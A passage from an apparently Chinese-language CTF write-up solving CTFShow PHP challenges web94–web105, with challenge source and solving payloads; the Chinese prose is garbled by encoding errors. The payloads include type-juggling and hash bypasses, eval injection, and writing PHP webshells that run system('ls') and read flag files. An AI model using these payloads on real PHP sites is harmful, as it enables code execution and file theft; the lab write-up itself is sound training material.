if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜å¤šäº† strpos($num,â€™0â€™)  æŸ¥æ‰¾å­—ç¬¦ä¸² 0 é¦–æ¬¡å‡ºç°çš„ä½ç½®</li>
<li>å°æ•°ç‚¹ç»•è¿‡: 4476.0</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web94.png"></p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:53:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ç›¸è¾ƒäºä¸Šä¸€é¢˜å¯¹å°æ•°ç‚¹è¿›è¡Œäº†åŒ¹é…</li>
<li>æ–°æ–¹æ³•: strpos() ç”¨ %0a(æ¢è¡Œ), %20(ç©ºæ ¼), %2b(+), ç©ºæ ¼ ç»•è¿‡</li>
<li>%0a010574, %20010574, %2b010574  </li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web95.png"></p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 19:21:24</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>if GET åˆ°çš„å­—ç¬¦ä¸²ä¸º flag.php åˆ™ä¼šç‹—å¸¦ã€‚</li>
<li>è€Œæ•´ä¸ªä»£ç ï¼Œæœ€å highlight_file() åœ¨ else ä¸Š ,é‚£ä¹ˆ GET åˆ°çš„ u å¿…é¡»ä¸º FALSEæ‰èƒ½æ‰§è¡Œelse,ä½†æ˜¯ u ä¸èƒ½ç­‰äº flag.php;ä¸è¿‡ highlight_file() ä½¿ç”¨è·¯å¾„ï¼Œé‚£ä¹ˆå°±æœ‰ ï¼š./flag.php .è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆ–è€…ç»å¯¹è·¯å¾„ : /var/www/html/flag.php</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web96.png"></p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 19:36:32</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">	if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">		if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">			echo $flag;</span><br><span class="line">		else</span><br><span class="line">			print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>çœ‹è§ md5 å°±è”æƒ³åˆ° md5ç¢°æ’å’Œæ•°ç»„ç»•è¿‡ï¼›ä¸‰ä¸ª = </li>
<li>æ•°ç»„</li>
<li>å¼ºç¢°æ’</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web97.png"></p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 21:39:27</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ä¸‰ç›®è¿ç®—ç¬¦ ä¸ &amp; </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> ? <span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span> : <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">// å¦‚æœ$_GETä¸º True ï¼š$_GET = &amp;$_POST --&gt; GETå­˜åœ¨ï¼ŒGETå°±ç­‰äºPOST,POSTä¼šè¦†ç›–æ‰GET,æ­¤å¤„GETæ²¡æœ‰å…·ä½“çš„indexé‚£å°±éšä¾¿ä¸€ä¸ªè¯•è¯•ã€‚</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">// æ²¡å•¥ç”¨å¤„</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span> ? <span class="variable">$flag</span> : <span class="keyword">__FILE__</span></span><br><span class="line"><span class="comment">// å¦‚æœ$_GET[&#x27;HTTP_FLAG&#x27;]ç­‰äº&#x27;flag&#x27; åˆ™ highlight_file($flag) å¦åˆ™å°± highlight_file(__FILE__)</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. POST ä¼šè¦†ç›–æ‰ GET
</code></pre>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web98.png"></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();// ç©ºæ•°ç»„</span><br><span class="line">// 0x36d = 877 for å¾ªç¯ç”Ÿæˆ 1 åˆ° $i ä¹‹é—´çš„éšæœºæ•°å¹¶å­˜å…¥åˆ°æ•°ç»„ $allow </span><br><span class="line">// array_push() ç›¸å½“äº python ä¸­ add()æ–¹æ³•</span><br><span class="line">for($i=36; $i&lt;0x36d; $i++)&#123;</span><br><span class="line">	array_push($allow, rand(1, $i));</span><br><span class="line">&#125;</span><br><span class="line">//var_dump($allow);</span><br><span class="line">// in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool</span><br><span class="line">// in_array() æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ å¦‚æœæ²¡æœ‰è®¾ç½® strict åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒï¼Œå°±ä¸ä¼šæ£€æŸ¥æŸ¥æ‰¾çš„æŸä¸ªå€¼æ˜¯å¦ä¸æ•°ç»„ä¸­ç±»å‹ä¸€è‡´ </span><br><span class="line">// æ£€æŸ¥æ•°ç»„ $allow ä¸­æ˜¯å¦å­˜åœ¨ $_GET[&#x27;n&#x27;]</span><br><span class="line">// file_put_contents($_GET[&#x27;n&#x27;],$_POST[&#x27;content&#x27;])å°†contentä¸nå†™å…¥æ–‡ä»¶</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_1.png"></p>
<ol>
<li>å°† <?php system('ls');?> å†™å…¥ 1.php,ç„¶åè®¿é—® 1.phpå¹¶æ‰¾åˆ° flag36d.php</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_2.png"></p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_3.png"></p>
<ol start="2">
<li><?php system('tac flag36d.php');?> å†™å…¥ 1.php ç„¶åè®¿é—®</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web99_4.png"></p>
<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-21 22:10:28</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>is_numeric()æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</li>
<li>$v1æ˜¯æ•°å­—ï¼Œ$v2ä¸èƒ½æœ‰åˆ†å·,$v3æœ‰åˆ†å·ï¼Œç„¶è€Œ is_numeric()æ˜¯æ£€æµ‹æ•°å­—çš„ï¼Œè€Œ$v2å’Œ$v3æœ‰åˆ†å·ï¼Œæ²¡åˆ†å·ï¼Œè¿™ä¸å°±çŸ›ç›¾äº†å—ï¼Ÿï¼Ÿï¼Ÿ</li>
<li>æ³¨æ„ and &amp;&amp; or || çš„åŒºåˆ«ï¼›and çš„ä¼˜å…ˆçº§ä½äº&amp;&amp;ä¹Ÿä½äº=ï¼›æ‰€ä»¥ $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); å…ˆæ‰§è¡Œ = èµ‹å€¼å°† $v1èµ‹å€¼ç»™ $v0,åé¢çš„è¢«å¿½ç•¥</li>
<li>æœ¬é¢˜æ²¡æœ‰å¯¹å‘½ä»¤è¿›è¡Œè¿‡æ»¤</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web100.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=show_source(<span class="string">&#x27;ctfshow.php&#x27;</span>)&amp;v3=;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web100_1.png"></p>
<p>å¦‚ä¸Šå›¾æ˜¾ç¤ºå‡º: $flag_is_c2ec8d720x2dd1960x2d46250x2daa520x2d967b8bad6aba å…¶ä¸­ 0x2dä¸ºåå…­è¿›åˆ¶ â€˜-â€˜ (çŸ­æ¨ªçº¿),å°†å…¶æ›¿æ¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;c2ec8d72-d196-<span class="number">4625</span>-aa52-<span class="number">967</span>b8bad6aba&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-22 00:26:48</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;</span><br><span class="line">        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­£åˆ™åŒ¹é…äº†ä¸€å¤§å †ä¸œè¥¿</li>
<li>æ¶‰åŠäº†æ–°çŸ¥è¯† åå°„ç±»</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2= <span class="keyword">echo</span> <span class="keyword">new</span> Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web101.png"></p>
<p>è¿™ä¸ª flagåé¢å·®ä¸€ä¸ªï¼Œä» 0-9,a-f çŒœä¸€ä¸ª</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-23 20:59:43</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>$v4 = is_numeric($v2) and is_numeric($v3); åªè¦ $v2æ˜¯æ•°å­—å°±è¡Œï¼Œåœ¨PHP ä¸­and å’Œ &amp;&amp; çš„ä¼˜å…ˆçº§ä¸åŒ</li>
<li>substr($v2,2)è¡¨ç¤ºå­—ç¬¦ä¸²$v2ä»ç¬¬äºŒä½å¼€å§‹æˆªå–ä¸€ç›´åˆ°æœ€å</li>
<li>call_user_func($v1,$s)è¡¨ç¤ºæŠŠ$v1ä½œä¸ºå›è°ƒå‡½æ•°(å¯ä»¥æ˜¯ç³»ç»Ÿå‡½æ•°æˆ–è‡ªå®šä¹‰å‡½æ•°)ï¼Œ$såˆ™ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102.png"></p>
<ol start="4">
<li>æŸ¥çœ‹äº†æç¤º (ğŸ‚ğŸº) hexbin() è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>
<li>/v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-<br>decode/resource=1.php post:v1=hex2bin</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102_1.png"></p>
<ol start="6">
<li>å†æŸ¥çœ‹1.php å³é”®æºç å³å¯å¾—åˆ°flag</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web102_2.png"></p>
<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-23 21:03:24</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class="line">        file_put_contents($v3,$str);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&#x27;Sorry&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>ä¸ä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œå¤šäº†æ­£åˆ™åŒ¹é…ä»»ç„¶å¯ä»¥ç”¨ä¸Šä¸€ä¸ªæ–¹æ³•</li>
</ol>
<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: atao</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-28 22:27:20</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>shal() å‡½æ•°ç®—å­—ç¬¦ä¸²çš„ sha1 æ•£åˆ—å€¼ , </li>
<li>æ­¤é¢˜ä¸ md5() çš„è§£æ³•ç±»ä¼¼ï¼Œéƒ½ä¸èƒ½å¤„ç†æ•°ç»„ä¸”ä¸ºè‹¥æ¯”è¾ƒ</li>
<li> ?v2[]=1 post: v1[]=2</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web104.png"></p>
<ol start="4">
<li>?v2=aaK1STfY post:v1=aaO8zKZF</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web104_1.png"></p>
<ol start="5">
<li>å…¶ä¸­ aaK1STfYçš„ sha1çš„å€¼ä¸º 0e76658526655756207688271159624026011393</li>
<li>å…¶ä¸­ aaO8zKZFçš„ sha1çš„å€¼ä¸º 0e89257456677279068558073954252716165668</li>
<li>å®ƒä»¬ä¸¤è€…ä½¿ç”¨è‹¥æ¯”è¾ƒä¸”0eçš„ç§‘å­¦è®¡æ•°æ³•çš„å€¼éƒ½ä¸º0 å› æ­¤å¯ä»¥ç»•è¿‡</li>
</ol>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>$$ä¸ºå¯å˜å˜é‡ï¼Œå³å˜é‡è¦†ç›–ã€‚</li>
<li>ä¾‹å¦‚ $a=â€™Aâ€™; $$a=â€™Zâ€™, $A=Z; $$aå…ˆæŠŠåé¢$aè§£æä¸ºâ€™Aâ€™,ç„¶å Aä½œä¸ºå˜é‡$Aç­‰äºZ</li>
<li>æ‡’å¾—ç»„ç»‡è¯­è¨€</li>
